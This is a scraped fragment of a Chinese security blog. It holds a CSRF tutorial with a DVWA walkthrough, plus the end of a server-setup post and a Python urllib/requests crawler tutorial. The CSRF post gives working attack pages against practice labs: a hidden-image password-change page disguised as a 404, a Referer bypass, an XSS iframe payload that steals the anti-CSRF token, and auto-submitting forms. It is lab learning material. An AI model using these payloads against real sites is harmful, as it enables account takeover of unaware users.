后记本篇博客主要记录了DHCP、FTP、DNS服务器的搭建。总的来说没踩多少坑，继续努力！","categories":[{"name":"运维","slug":"运维","permalink":"https://qwzf.github.io/categories/运维/"},{"name":"Linux网络服务","slug":"运维/Linux网络服务","permalink":"https://qwzf.github.io/categories/运维/Linux网络服务/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://qwzf.github.io/tags/Linux/"},{"name":"DHCP","slug":"DHCP","permalink":"https://qwzf.github.io/tags/DHCP/"},{"name":"FTP","slug":"FTP","permalink":"https://qwzf.github.io/tags/FTP/"},{"name":"DNS","slug":"DNS","permalink":"https://qwzf.github.io/tags/DNS/"}],"author":"qwzf"},{"title":"从一些常见场景到CSRF漏洞利用","slug":"从一些常见场景到CSRF漏洞利用","date":"2020-03-04T13:55:20.000Z","updated":"2020-08-01T16:54:26.094Z","comments":true,"path":"2020/03/04/从一些常见场景到CSRF漏洞利用/","link":"","permalink":"https://qwzf.github.io/2020/03/04/从一些常见场景到CSRF漏洞利用/","excerpt":"","text":"本文首发于先知社区 0x00 前言闲来无事，开启了CSRF与SSRF漏洞的学习之旅。为什么要放一起学习呢？因为两者比较像，都是请求伪造。CSRF跨站请求伪造，SSRF服务器请求伪造。 0x01 CSRF漏洞简介对web客户端的攻击，除了XSS以外，还有一个非常重要的漏洞就是CSRF。CSRF最关键的是利用受害者的Cookie向服务器发送伪造请求。1.CSRF漏洞概念CSRF（Cross-site request forgery，跨站请求伪造），也被称为“One Click Attack”或Session Riding，通常缩写为CSRF或者XSRF，是基于客户端操作的请求伪造，是一种对网站的恶意利用。2.CSRF与XSS的区别CSRF听起来像跨站脚本攻击(XSS)，但与XSS不同。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。什么意思呢？我的理解就是：XSS利用的是用户对指定网站的信任，CSRF利用是网站对用户浏览器的信任。3.CSRF漏洞原理学习过程中，参考了一下大师傅的博客，发现CSRF原理可以分为狭义的CSRF和广义的CSRF 狭义的CSRF：是指在攻击者已经将代码植入受害用户的浏览器访问的页面的前提下，以“受害用户”的身份向服务端发起一个伪造的http请求，从而实现服务器CURD来执行读写操作。 广义的CSRF：就是攻击者将一个http接口中需要传递的所有参数都预测出来，然后不管以什么方式，都可以来任意调用你的接口，对服务器实现CURD 4.CSRF攻击流程 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站bA； 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A； 用户未退出网站A之前，在同一浏览器中，打开一个标签页访问恶意网站B； 恶意网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求访问第三方站点A； 浏览器在接收到这些攻击性代码后，根据恶意网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自恶意网站B的恶意代码被执行。 5.CSRF攻击实现的条件 登录受信任站点WebA，并在本地生成Cookie。 在不登出WebA的情况下，访问站点WebB。 0x02 常见CSRF攻击类型常见CSRF攻击类型有：GET型CSRF、POST型CSRF下面使用必火团队的CSRF在线靶场进行验证。靶场地址GET型仅需要一个HTTP请求。就能够构造一次简单的CSRF。 银行站点,正常GET请求来完毕银行转账给admin的10元操作： http://www.nanhack.com/payload/xss/csrf1.php?name=admin&amp;money=10 恶意攻击者页面：http://www.nanhack.com/payload/xss/csrf1.php 访问恶意攻击者页面产生CSRF请求： http://www.nanhack.com/payload/xss/csrf1.php?name=zsm&amp;money=1000 用户登录了银行站点，然后访问恶意攻击者页面，这时qwzf的银行账户少了1000。原因：银行站点A违反了HTTP规范，使用GET请求更新资源。用户在访问恶意攻击者页面之前，已经登录了银行站点，而攻击者页面中的 一个合法的请求，但这里被不法分子利用了。浏览器会带上银行站点的Cookie发出Get请求，去获取资源以GET的方式请求第三方资源（这里的第三方就是指银行站点了，这里是https://www.nanhack.com/payload/xss/csrf1.php?name=zsm&amp;money=1000 ，结果银行站点服务器收到请求后，认为这是一个更新资源操作(转账操作)，所以就立马进行转账操作。从而qwzf的银行账户转账给zsm账户1000元。直接构造CSRF链接，隐蔽性太低。于是可以采用标签等方法进行隐藏。4种GET型CSRF构造方式 链接利用(a标签) iframe利用可以设置iframe的style为display:none，以此来不显示iframe加载的内容 img标签利用img标签内的内容会随着页面加载而被请求，以此src指向的位置会在页面加载过程中进行请求 background利用可以利用CSS中background样式中的url来加载远程机器上的内容，从而对url中的内容发送HTTP请求 POST型危害没有GET型的大，利用通常使用的是一个自动提交的表单。如： &lt;form name=&quot;csrf&quot; action=&quot;http://edu.xss.tv/payload/xss/csrf2.php&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;zhangsan&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;money&quot; value=&quot;1000&quot;&gt; &lt;/form&gt; &lt;script type=&quot;text/javascript&quot;&gt;document.csrf.submit();&lt;/script&gt; 访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。 0x03 CSRF漏洞探测利用自动化探测工具CSRFTester或者burp自带CSRF POC1.CSRFTester设置浏览器代理:127.0.0.1:8008，burp是80802.登录web应用程序，提交表单，在CSRF工具中修改表单内容，查看是否更改，如果更改就存在CSRF漏洞3.生成CSRF的POC参考：Web安全Day3 - CSRF实战攻防 0x04 CSRF漏洞防御 设置和判断cookie时采用hash值认证。 尽量采用post类型传参，这就减少了请求被直接伪造的可能。 验证HTTP Referer字段 在 HTTP 头中自定义属性并验证 在请求地址中添加token并验证 采用验证码判断，进行防御。 0x05 DVWA靶场CSRF练习首先，先登录DVWA，以在浏览器上保存Cookie信息。用户名：admin 密码：password 1.Low级查看下源码(这里只写一些关键代码)： &lt;?php if (isset($_GET[&#39;Change&#39;])) { //获取两次密码输入 $pass_new = $_GET[&#39;password_new&#39;]; $pass_conf = $_GET[&#39;password_conf&#39;]; if (($pass_new == $pass_conf)){ $pass_new = mysql_real_escape_string($pass_new); //过滤字符串 $pass_new = md5($pass_new); $insert=&quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;admin&#39;;&quot;; $result=mysql_query($insert) or die(&#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); echo &quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;; mysql_close(); } else{ echo &quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;; } } ?&gt; 首先获取输入的两个密码然后判断两个值是否相等，若相等则接着对pass_new变量进行调用mysql_real_escape_string()函数来进行字符串的过滤、再调用md5()函数对输入的密码进行MD5加密，最后再将新密码更新到数据库中。整段代码因为调用了mysql_real_escape_string()函数从而有效地过滤了SQL注入，但是对CSRF没有任何的防御机制。(当然服务器对请求的发送者是做了身份验证的，检查Cookie，只是这里代码没有体现) Low级漏洞利用正常修改密码： http://192.168.1.3/DVWA/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change# （1）直接构造链接 http://192.168.1.3/DVWA/vulnerabilities/csrf/?password_new=qwzf&amp;password_conf=qwzf&amp;Change=Change# 当受害者点击这个链接，他的密码就会被改成qwzf（这种构造一眼就能看出来是改密码，隐蔽性太低）（2）使用短链接来隐藏URL生成短链接常用网址：站长工具百度短网址点击短链接，会自动跳转到真实网站。在实际攻击场景下只要目标服务器的域名不是ip，并且是远程服务器。（3）构造攻击页面通过img标签中的src属性来加载CSRF攻击利用的URL，并进行布局隐藏，然后在公网上传下面这个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里我写一个qwzf.html： &lt;html&gt; &lt;head&gt; &lt;title&gt;404 Not Found&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Not Found&lt;/h1&gt; &lt;img src=&quot;http://192.168.1.3/DVWA/vulnerabilities/csrf/?password_new=qwzf&amp;password_conf=qwzf&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt; &lt;p&gt;The requested URL /qwzf.html was not found on this server.&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; 当用户访问qwzf.html时，会误认为是自己访问一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了qwzf。 2.Medium级查看源码发现，比Low级多了个if判断 if( isset( $_GET[ &#39;Change&#39; ] ) ) { // Checks to see where the request came from if( eregi( $_SERVER[ &#39;SERVER_NAME&#39; ], $_SERVER[ &#39;HTTP_REFERER&#39; ] ) ) { eregi(string pattern, string string)检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。同时可以看到，Medium级的代码检查了保留变量 HTTP_REFERER(http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME(http包头的Host参数，及要访问的主机名，这里是192.168.1.3)，希望通过这种机制抵御CSRF攻击。 Medium级漏洞利用将之前qwzf.html攻击页面命名为192.168.1.3.html，然后放置在攻击者的服务器里，这里是http://39.x.93.165:8080/Referer参数绕过过滤规则密码被修改为了qwzf 3.High级查看源码发现，比Low级多了随机token if( isset( $_GET[ &#39;Change&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); ...... } // Generate Anti-CSRF token generateSessionToken(); High级的代码加入了Anti-CSRF token机制，即用户每次访问改密页面时，服务器会返回一个随机的token。向服务器发起请求时，需要提交token参数。而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。 暴力破解可以突破CSRF Token原因：构造HTTP请求的对象不一样。暴力破解，攻击者是当前用户，受害者是其他用户。CSRF攻击者是其他用户，受害者是当前用户。 High级漏洞利用绕过反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。可不可以在自己的恶意页面中运行js脚本而取得目标页面的token呢？当然是不可以，浏览器普遍对跨域请求资源有访问控制。对于需要验证的资源，跨域请求会被拒绝。但是如果同时存在存储xss漏洞的话，可进行csrf利用。（1）首先我们需要先获取用户token，由于现在都已经不支持跨域请求访问了，所以只能从别的地方入手获取token，查看大师傅博客，发现可以利用下面的脚本在XSS(Stored)的Name参数进行XSS攻击，获取用户token： &lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)&gt; （2）然后将下面的脚本构造攻击页面放到攻击服务器上，诱导用户点击，从而实现攻击csrf.html &lt;script type=&quot;text/javascript&quot;&gt; function attack() { document.getElementById(&quot;transfer&quot;).submit(); } &lt;/script&gt; &lt;body οnlοad=&quot;attack()&quot;&gt; &lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://192.168.1.3/dvwa/vulnerabilities/csrf&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;qwzf&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;qwzf&quot;&gt; &lt;input type=&#39;hidden&#39; name=&#39;user_token&#39; value=&quot;8519d07c0e08e8ef0461311e9a880af5&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt; &lt;/form&gt; &lt;/body&gt; 另外high级还有一种大师傅发现的方法，参考大师傅博客：DVWA 1.10 High等级的CSRF另类通关法 0x06 后记通过学习CSRF漏洞，感觉Web安全竟如此有趣，继续加油！！！","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"CSRF漏洞","slug":"漏洞原理/CSRF漏洞","permalink":"https://qwzf.github.io/categories/漏洞原理/CSRF漏洞/"}],"tags":[{"name":"靶场练习","slug":"靶场练习","permalink":"https://qwzf.github.io/tags/靶场练习/"},{"name":"攻击类型","slug":"攻击类型","permalink":"https://qwzf.github.io/tags/攻击类型/"}],"author":"qwzf"},{"title":"Python学习-网络爬虫(一)","slug":"Python学习-网络爬虫(一)","date":"2020-02-19T16:12:43.387Z","updated":"2020-08-01T15:51:12.823Z","comments":true,"path":"2020/02/20/Python学习-网络爬虫(一)/","link":"","permalink":"https://qwzf.github.io/2020/02/20/Python学习-网络爬虫(一)/","excerpt":"","text":"0x00 前言一直都听说过网络爬虫，网络爬虫到底是什么？带着这个问题，我开始学习编写网络爬虫。下面记录了我学习过程中遇到的网络爬虫相关知识： 0x01 爬虫基本原理1、爬虫概述 1.1 网络爬虫是什么？网络爬虫是请求网站并提取数据的自动化程序。网络爬虫有很多类型，常用的有通用网络爬虫、聚焦网络爬虫等。 1.2 爬虫基本流程 发起请求：通过HTTP库向目标站点发起请求，即发送一个Request,请求可以包含额外的headers等信息，等待服务器响应。 获取响应内容：如果服务器能正常响应，会得到一个Response,Response的内容便是所要获取的页面内容，类型可能有HTML, Json字符串，二进制数据(如图片视频)等类型。 解析内容：得到的内容可能是HTML，可以用正则表达式、网页解析库进行解析。可能是Json, 可以直接转为Json对象解析，可能是二进制数据，可以做保存或者进一步的处理。 保存数据：保存形式多样，可以存为文本，也可以保存至数据库，或者保存特定格式的文件。 1.3 能抓取怎样的数据？ 网页文本：如HTML文档、Json格式文本等。 图片：获取到的是二进制文件，保存为图片格式。 视频：同为二进制文件，保存为视频格式即可。 其他：只要是能请求到的，都能获取。2、爬虫基本流程的实现 2.1 Request 请求方式：主要有GET、POST两种类型，另外还有HEAD、PUT、DELETE、OPTIONS等。 请求URL：URL全称统一资源定位符， 如一个网页文档、一张图片、一个视频等都可以用URL唯一来确定。 请求头：包含请求时的头部信息，如User-Agent、 Host、Cookies等信息。 请求体：请求时额外携带的数据如表单提交时的表单数据。 2.2 Response 响应状态：有多种响应状态，如200代表成功、301跳转、404找不到页面、502服务器错误等。 响应头：如内容类型、内容长度、服务器信息、设置Cookie等等。 响应体：最主要的部分，包含了请求资源的内容，如网页HTML、图片二进制数据等。 2.3.1 怎样来解析？(解析方式) 直接处理 Json解析 正则表达式 解析库(BeautifulSoup、PyQuery、Xpath) 2.3.2 怎样解决JavaScript渲染的问题？ 分析Ajax请求 Selenium/WebDriver Splash PyV8、Ghost.py 2.4 怎样保存数据？ 文本：纯文本、Json、Xml等。 关系型数据库：如MySQL、Oracle、SQL Server等具有结构化表结构形式存储。 非关系型数据库：如MongoDB、Redis等Key-Value形式存储。 二进制文件：如图片、视频、音频等等直接保存成特定格式即可。 0x02 Python爬虫常用库1.1 urllibPython 内置的 HTTP 请求库，也就是说不需要额外安装即可使用。 urllib.request：请求模块，它是最基本的 HTTP 请求模块，可以用来模拟发送请求。 urllib.error：异常处理模块，如果出现请求错误，我们可以捕获这些异常，然后进行重试或其他操作以保证程序不会意外终止。 urllib.parse：url解析模块，提供了许多 URL 处理方法，比如拆分、解析、合并等。 urllib.robotparser：robots.txt解析模块，主要是用来识别网站的 robots.txt 文件，然后判断哪些网站可以爬，哪些网站不可以爬，用得比较少。 与Python2相比的变化 Python import urllib2 response = urllib.urlopen(&#39;http://www.baidu.com&#39;) Python3 import urllib.request response = urllib.request.urlopen(&#39;http://www.baidu.com&#39;) 1.2 urllib基础操作1.2.1 urlopen urllib.request.urlopen(url,data=None,[timeout,]*,cafile=None,capath=None,cadefault=False,context=None) get类型： import urllib.request response = urllib.request.urlopen(&#39;http://httpbin.org/get&#39;) print(response.read().decode(&#39;utf-8&#39;)) post类型： import urllib.parse import urllib.request data = bytes(urllib.parse.urlencode({&#39;word&#39;:&#39;hello&#39;}),encoding=&#39;utf8&#39;) response = urllib.request.urlopen(&#39;http://httpbin.org/post&#39;,data=data) print(response.read()) 超时设置： import socket import urllib.request import urllib.error try: response = urllib.request.urlopen(&#39;http://httpbin.org/get&#39;,timeout=0.1) except urllib.error.URLError as e: if isinstance(e.reason,socket.timeout): print(&#39;time out!&#39;) 1.2.2 响应响应类型、状态码、响应头、响应内容： import urllib.request response = urllib.request.urlopen(&#39;http://www.baidu.com&#39;) print(type(response)) #响应类型 print(response.status) #状态码 print(response.getheaders()) #响应头 print(response.getheader(&#39;Server&#39;)) #获取特定响应头 print(response.read().decode(&#39;utf-8&#39;) #响应内容 1.2.3 Request urllib.request.Request(url, data=None, headers={}, origin_req_host=None, unverifiable=False, method=None) url 用于请求 URL，这是必传参数，其他都是可选参数。data 如果要传，必须传 bytes（字节流）类型的。如果是字典，可以先用urllib.parse模块里的 urlencode()编码。headers 是一个字典，它就是请求头，在构造请求时通过headers参数直接构造，也可以通过调用请求实例的 add_header()方法添加。添加请求头最常用的是通过修改User-Agent来伪装浏览器，默认的 User-Agent是 Python-urllib，我们可以通过修改它来伪装浏览器。比如要伪装火狐浏览器，你可以把它设置为：Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11origin_req_host 指的是请求方的 host 名称或者 IP 地址。unverifiable 表示这个请求是否是无法验证的，默认是 False，意思就是说用户没有足够权限来选择接收这个请求的结果。例如，我们请求一个 HTML 文档中的图片，但是我们没有自动抓取图像的权限，这时 unverifiable 的值就是 True。method 是一个字符串，用来指示请求使用的方法，比如 GET、POST 和 PUT 等。 get类型： import urllib.request request = urllib.request.Request(&#39;http://httpbin.org/get&#39;) response = urllib.request.urlopen(request) print(response.read().decode(&#39;utf-8&#39;)) post类型： from urllib import request,parse url = &#39;http://httpbin.org/post&#39; headers = { &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0&#39;, &#39;Host&#39;:&#39;httpbin.org&#39; } dict = { &#39;name&#39;:&#39;qwzf&#39; } data = bytes(parse.urlencode(dict),encoding=&#39;utf8&#39;) req = request.Request(url=url,data=data,headers=headers,method=&#39;POST&#39;) response = request.urlopen(req) print(response.read().decode(&#39;utf-8&#39;)) 另一种post： from urllib import request,parse url = &#39;http://httpbin.org/post&#39; dict = { &#39;name&#39;:&#39;qwzf&#39; } data = bytes(parse.urlencode(dict),encoding=&#39;utf8&#39;) req = request.Request(url=url,data=data,method=&#39;POST&#39;) req.add_header(&#39;User-Agent&#39;,&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0)&#39;) response = request.urlopen(req) print(response.read().decode(&#39;utf-8&#39;)) 1.3 urllib高级操作1.3.1 Handler（1）代理代理之前打开控制面板-&gt;网络和 Internet-&gt;Internet选项-&gt;连接-&gt;局域网设置-&gt;代理服务器看到系统代理端口为10809，然后使用代理软件开启代理服务即可。 from urllib.error import URLError from urllib.request import ProxyHandler, build_opener proxy_handler = ProxyHandler({ &#39;http&#39;: &#39;http://127.0.0.1:10809&#39;, &#39;https&#39;: &#39;https://127.0.0.1:10809&#39; }) opener = build_opener(proxy_handler) try: response = opener.open(&#39;http://httpbin.org/get&#39;) print(response.read().decode(&#39;utf-8&#39;)) except URLError as e: print(e.reason) 代理成功（2）Cookie #cookie变量被赋值为请求地址的Cookie import http.cookiejar, urllib.request cookie = http.cookiejar.CookieJar() #声明CookieJar对象 handler = urllib.request.HTTPCookieProcessor(cookie)#构建处理Cookie opener = urllib.request.build_opener(handler) #build_opener传递Cookie response = opener.open(&#39;http://www.baidu.com&#39;) for item in cookie: #打印Cookie信息 print(item.name+&quot;=&quot;+item.value) #将请求地址的Cookie保存为文本文件 import http.cookiejar, urllib.request filename = &quot;cookie.txt&quot; #将cookie保存成文本文件 #声明CookieJar对象的子类对象 #cookie = http.cookiejar.MozillaCookieJar(filename) #声明MozillaCookieJar cookie = http.cookiejar.LWPCookieJar(filename) #声明LWPCookieJar handler = urllib.request.HTTPCookieProcessor(cookie) opener = urllib.request.build_opener(handler) response = opener.open(&#39;http://www.baidu.com&#39;) cookie.save(ignore_discard=True, ignore_expires=True) #save()方法将Cookie保存成文本文件 #读取文本文件里存放的Cookie并附着在新的请求地址 import http.cookiejar, urllib.request cookie = http.cookiejar.LWPCookieJar() cookie.load(&#39;cookie.txt&#39;, ignore_discard=True, ignore_expires=True) handler = urllib.request.HTTPCookieProcessor(cookie) opener = urllib.request.build_opener(handler) response = opener.open(&#39;http://www.baidu.com&#39;) print(response.read().decode(&#39;utf-8&#39;)) 1.3.2 异常处理urllib.error异常类型: URLError 属性：reason HTTPError 属性：code、reason、headers ContentTooShortError(msg,content) from urllib import request, error try: response = request.urlopen(&#39;http://www.httpbin.org/qwzf&#39;) except error.HTTPError as e: print(e.reason, e.code, e.headers, sep=&#39;\\n&#39;) except error.URLError as e: print(e.reason) else: print(&#39;Request Successfully&#39;) import socket import urllib.request import urllib.error try: response = urllib.request.urlopen(&#39;https://www.baidu.com&#39;, timeout=0.01) except urllib.error.URLError as e: print(type(e.reason)) if isinstance(e.reason, socket.timeout): print(&#39;TIME OUT&#39;) 1.3.3 URL解析（1）urlparse分隔url urllib.parse.urlparse(urlstring, scheme=&#39;&#39;, allow_fragments=True) #分隔url from urllib.parse import urlparse result = urlparse(&#39;http://www.baidu.com/index.html;user?id=5#comment&#39;) print(type(result), result) 运行结果： &lt;class &#39;urllib.parse.ParseResult&#39;&gt; ParseResult(scheme=&#39;http&#39;, netloc=&#39;www.baidu.com&#39;, path=&#39;/index.html&#39;, params=&#39;user&#39;, query=&#39;id=5&#39;, fragment=&#39;comment&#39;) #指定以https解析 from urllib.parse import urlparse result = urlparse(&#39;www.baidu.com/index.html;user?id=5#comment&#39;, scheme=&#39;https&#39;) print(result) #scheme作为默认，如果url指定解析方式，则scheme不生效 from urllib.parse import urlparse result = urlparse(&#39;http://www.baidu.com/index.html;user?id=5#comment&#39;, scheme=&#39;https&#39;) print(result) from urllib.parse import urlparse result1 = urlparse(&#39;http://www.baidu.com/index.html;user?id=5#comment&#39;, allow_fragments=False) result2 = urlparse(&#39;http://www.baidu.com/index.html#comment&#39;, allow_fragments=False) print(result1,&#39;\\n&#39;,result2) 运行结果： ParseResult(scheme=&#39;http&#39;, netloc=&#39;www.baidu.com&#39;, path=&#39;/index.html&#39;, params=&#39;user&#39;, query=&#39;id=5#comment&#39;, fragment=&#39;&#39;) ParseResult(scheme=&#39;http&#39;, netloc=&#39;www.baidu.com&#39;, path=&#39;/index.html#comment&#39;, params=&#39;&#39;, query=&#39;&#39;, fragment=&#39;&#39;) （2）urlunparse拼接url from urllib.parse import urlunparse data = [&#39;http&#39;, &#39;www.baidu.com&#39;, &#39;index.html&#39;, &#39;user&#39;, &#39;a=6&#39;, &#39;comment&#39;] print(urlunparse(data)) 运行结果： http://www.baidu.com/index.html;user?a=6#comment （3）urljoin拼接url from urllib.parse import urljoin print(urljoin(&#39;http://www.baidu.com&#39;, &#39;FAQ.html&#39;)) #后边url字段覆盖前面的url字段。 #前面有字段不存在，则补充。存在则覆盖 print(urljoin(&#39;http://www.baidu.com&#39;, &#39;https://cuiqingcai.com/FAQ.html&#39;)) print(urljoin(&#39;http://www.baidu.com/about.html&#39;, &#39;https://cuiqingcai.com/FAQ.html&#39;)) print(urljoin(&#39;http://www.baidu.com/about.html&#39;, &#39;https://cuiqingcai.com/FAQ.html?question=2&#39;)) print(urljoin(&#39;http://www.baidu.com?wd=abc&#39;, &#39;https://cuiqingcai.com/index.php&#39;)) print(urljoin(&#39;http://www.baidu.com&#39;, &#39;?category=2#comment&#39;)) print(urljoin(&#39;www.baidu.com&#39;, &#39;?category=2#comment&#39;)) print(urljoin(&#39;www.baidu.com#comment&#39;, &#39;?category=2&#39;)) （4）urlencode把字典对象转换成get请求参数 from urllib.parse import urlencode params = { &#39;name&#39;: &#39;qwzf&#39;, &#39;age&#39;: 20 } base_url = &#39;http://www.baidu.com?&#39; url = base_url + urlencode(params) print(url) 2.1 requests基于urllib，采用Apache2 Licensed开源协议的HTTP库。简单来说，requests是Python实现的简单易用的HTTP库。2.1.1 安装 pip3: pip3 install requests pip: pip install requests #指定python版本安装：python3 -m pip install requests 2.2 requests基础操作2.2.1 各种请求方式import requests requests.post(&#39;http://httpbin.org/post&#39;) requests.put(&#39;http://httpbin.org/put&#39;) requests.delete(&#39;http://httpbin.org/delete&#39;) requests.head(&#39;http://httpbin.org/get&#39;) requests.options(&#39;http://httpbin.org/get&#39;) 2.2.2 请求2.2.2.1 基本GET请求（1）基本写法 import requests response = requests.get(&#39;http://httpbin.org/get&#39;) print(response.text) （2）带参数GET请求 import requests data = { &#39;name&#39;: &#39;qwzf&#39;, &#39;age&#39;: 20 } response = requests.get(&quot;http://httpbin.org/get&quot;, params=data) print(response.text) （3）解析json import requests import json response = requests.get(&quot;http://httpbin.org/get&quot;) print(response.text) print(response.json()) print(json.loads(response.text)) （4）获取二进制数据 import requests response = requests.get(&quot;https://github.com/favicon.ico&quot;) print(type(response.text), type(response.content)) print(response.text) print(response.content) #获取二进制内容 将二进制数据写入二进制文件(如：图片、视频)： import requests response = requests.get(&quot;https://github.com/favicon.ico&quot;) with open(&#39;favicon.ico&#39;, &#39;wb&#39;) as f: f.write(response.content) f.close() （5）添加headers import requests headers = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&#39; } response = requests.get(&quot;https://www.zhihu.com/explore&quot;, headers=headers) print(response.text) 2.2.2.2 基本POST请求（1）带参数POST请求 import requests data = {&#39;name&#39;: &#39;qwzf&#39;, &#39;age&#39;: &#39;20&#39;} response = requests.post(&quot;http://httpbin.org/post&quot;, data=data) print(response.text) （2）带参数、添加headers和解析json的POST请求 import requests data = {&#39;name&#39;: &#39;qwzf&#39;, &#39;age&#39;: &#39;20&#39;} headers = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&#39; } response = requests.post(&quot;http://httpbin.org/post&quot;, data=data, headers=headers) print(response.json()) 2.2.3 响应2.2.3.1 reponse属性import requests response = requests.get(&#39;http://www.jianshu.com&#39;) print(type(response.status_code), response.status_code) #状态码 print(type(response.headers), response.headers) #响应头 print(type(response.cookies), response.cookies) #Cookie print(type(response.url), response.url) #url print(type(response.history), response.history) #访问的历史记录 2.2.3.2 状态码判断#判断Not Found import requests response = requests.get(&#39;http://www.aliyun.com/qwzf.html&#39;) if response.status_code == requests.codes.not_found: print(&#39;404 Not Found&#39;) #判断Successfully import requests response = requests.get(&#39;http://www.aliyun.com&#39;) if response.status_code == 200: print(&#39;Request Successfully&#39;) 2.3 requests高级操作2.3.1 文件上传 import requests files = {&#39;file&#39;: open(&#39;favicon.ico&#39;, &#39;rb&#39;)} response = requests.post(&quot;http://httpbin.org/post&quot;, files=files) print(response.text) 2.3.2 获取cookie import requests response = requests.get(&quot;http://www.baidu.com&quot;) print(response.cookies) for key, value in response.cookies.items(): print(key + &#39;=&#39; + value) 2.3.3 会话维持模拟登陆 import requests requests.get(&#39;http://httpbin.org/cookies/set/number/123456789&#39;) response = requests.get(&#39;http://httpbin.org/cookies&#39;) print(response.text) 实现在同一个浏览器实现setcookie和getcookie： import requests s = requests.Session() #维持会话信息，使用Session对象发起两次请求 s.get(&#39;http://httpbin.org/cookies/set/number/123456789&#39;) response = s.get(&#39;http://httpbin.org/cookies&#39;) print(response.text) 2.3.4 证书验证用于https解析url中的证书问题 import requests response = requests.get(&#39;https://www.12306.cn&#39;) #https://www.12306.cn证书又正常了，暂时没找到证书失效的网站进行验证 print(response.status_code) 如果证书失效，使用下面代码，会返回状态码： import requests from requests.packages import urllib3 urllib3.disable_warnings() #消除警告信息 response = requests.get(&#39;https://www.12306.cn&#39;, verify=False) print(response.status_code) 手动指定证书： import requests response = requests.get(&#39;https://www.12306.cn&#39;, cert=(&#39;/path/server.crt&#39;, &#39;/path/key&#39;)) print(response.status_code) 2.3.5 代理设置系统代理开启，参考urllib代理设置。 import requests proxies = { &quot;http&quot;: &quot;http://127.0.0.1:10809&quot;, &quot;https&quot;: &quot;https://127.0.0.1:10809&quot;, } &#39;&#39;&#39;proxies = {#如果代理有用户名和密码 &quot;http&quot;: &quot;http://user:password@127.0.0.1:10809/&quot;, &quot;https&quot;: &quot;https://user:password@127.0.0.1:10809/&quot;, }&#39;&#39;&#39; response = requests.get(&quot;https://www.taobao.com&quot;, proxies=proxies) print(response.status_code) 如果代理不是http和https代理，如socks代理：pip3 install &#39;requests[socks]&#39;设置开启socks代理，然后运行下面代码： import requests proxies = { &#39;http&#39;: &#39;socks5://127.0.0.1:10809&#39;, &#39;https&#39;: &#39;socks5://127.0.0.1:10809&#39; } response = requests.get(&quot;https://www.taobao.com&quot;, proxies=proxies) print(response.status_code) 2.3.6 超时设置 import requests from requests.exceptions import ReadTimeout try: response = requests.get(&quot;http://httpbin.org/get&quot;, timeout=0.5) print(response.status_code) except ReadTimeout:#捕获异常 print(&#39;Time out！&#39;) 2.3.7 认证设置登录验证 import requests from requests.auth import HTTPBasicAuth r = requests.get(&#39;http://example.com/&#39;, auth=HTTPBasicAuth(&#39;qwzf&#39;, &#39;123&#39;)) print(r.status_code) 使用字典的方式： import requests r = requests.get(&#39;http://example.com/&#39;, auth=(&#39;user&#39;, &#39;123&#39;)) print(r.status_code) 2.3.8 异常处理可以参考request.exceptions异常处理 import requests from requests.exceptions import ReadTimeout, ConnectionError, RequestException try: response = requests.get(&quot;http://httpbin.org/get&quot;, timeout = 0.5) print(response.status_code) except ReadTimeout: #捕获超时异常 print(&#39;Timeout&#39;) except ConnectionError: #捕获连接异常 print(&#39;Connection error&#39;) except RequestException: #一个父类异常 print(&#39;Error&#39;) 0x03 